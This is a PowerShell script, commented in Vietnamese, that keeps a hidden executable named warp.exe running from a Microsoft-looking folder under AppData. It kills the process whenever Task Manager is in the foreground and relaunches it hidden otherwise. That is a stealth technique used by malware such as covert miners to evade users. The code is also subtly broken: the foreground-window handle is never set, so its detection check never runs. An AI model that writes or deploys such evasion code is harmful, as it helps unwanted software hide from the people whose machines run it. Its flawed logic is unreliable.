$targetProcess = "warp" # Tên tiến trình (không có đuôi .exe cho lệnh PowerShell)
$warpPath = "$env:APPDATA\Microsoft\warp.exe"

$signature = @'
[DllImport("user32.dll")]
public static extern IntPtr GetForegroundWindow();

[DllImport("user32.dll")]
public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder lpString, int nMaxCount);
'@

$user32 = Add-Type -MemberDefinition $signature -Name "User32" -Namespace Win32 -PassThru

while ($true) {
    
    # 1. Logic hàm isTaskManagerInFocus()
    $isFocused = $false

    if ($hwnd -ne [IntPtr]::Zero) {
        $sb = New-Object System.Text.StringBuilder 256
        $null = $user32::GetWindowText($hwnd, $sb, $sb.Capacity)
        $title = $sb.ToString()

        if ($title -like "*Task Manager*" -or $title -like "*Trình quản lý tác vụ*") {
            $isFocused = $true
        }
    }

    if ($isFocused) {
        $process = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
        if ($process) {
            # killProcess(targetProcess)
            Stop-Process -Name $targetProcess -Force -ErrorAction SilentlyContinue
        }
    } 
    else {
        $process = Get-Process -Name $targetProcess -ErrorAction SilentlyContinue
        if (-not $process) {
            if (Test-Path $warpPath) {
                # ShellExecuteA với SW_HIDE
                Start-Process -FilePath $warpPath -WindowStyle Hidden -ErrorAction SilentlyContinue
                
                Start-Sleep -Seconds 3
            }
        }
    }

    Start-Sleep -Milliseconds 500
}